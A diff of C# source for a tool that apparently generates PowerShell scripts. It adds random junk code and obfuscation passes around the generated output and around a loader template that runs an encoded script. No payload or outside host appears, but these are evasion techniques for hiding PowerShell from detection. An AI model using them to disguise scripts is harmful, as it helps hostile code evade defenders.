@@ -1,4 +1,5 @@
-﻿using System.Diagnostics.CodeAnalysis;
+﻿using System.Collections.Immutable;
+using System.Diagnostics.CodeAnalysis;
 using System.Text;
 using System.Text.Json;
 using System.Text.Json.Nodes;
@@ -148,9 +149,13 @@ _SERVER
     {
         foreach (var x in SourceFiles.Where(a=> a.Name == EntryPoint))
         {
+            if (IsObfuscate)
+                Builder.Append(new PowerShellObfuscator().RandomCode());
             Builder.Append(x.Data);
             Builder.AppendLine();
         }
+        if (IsObfuscate)
+            Builder.Append(new PowerShellObfuscator().RandomCode());
         Builder.AppendLine("");
         
         var psString = new StringBuilder();
@@ -164,7 +169,7 @@ _SERVER
         body = body.Replace("###doo", doo);
         dataProd = head + Environment.NewLine + dataProd + Environment.NewLine + body;
         if (IsObfuscate)
-            dataProd = new PowerShellObfuscator().RandomCode() + dataProd + new PowerShellObfuscator().RandomCode();
+            dataProd = new PowerShellObfuscator().Obfuscate(dataProd);
         File.WriteAllText(OutputFile,dataProd);
     }
 
@@ -180,13 +185,10 @@ _SERVER
         }
     }
     
-    
     protected string PfxFile(string domain)
     {
         return Path.Combine(Model.CertDir, domain + ".pfx");
     }
-
-  
     
     static (string Head, string Body) ExtractHeadAndBody(string input)
     {
@@ -231,7 +233,10 @@ _SERVER
     private string GeneratePowerShellScript(string powerShellCode)
     {
         var encoded = CustomCryptor.Encode(powerShellCode);
-        var data = $"$EncodedScript = \"{encoded}\"" + Environment.NewLine + ReadSource("dynamic").Data;
+        var script = ReadSource("dynamic").Data;
+        if (IsObfuscate)
+            script = new PowerShellObfuscator().Obfuscate(script);
+        var data = new PowerShellObfuscator().RandomCode() +  $"$EncodedScript = \"{encoded}\"" + Environment.NewLine + script;
         return data;
     }
 
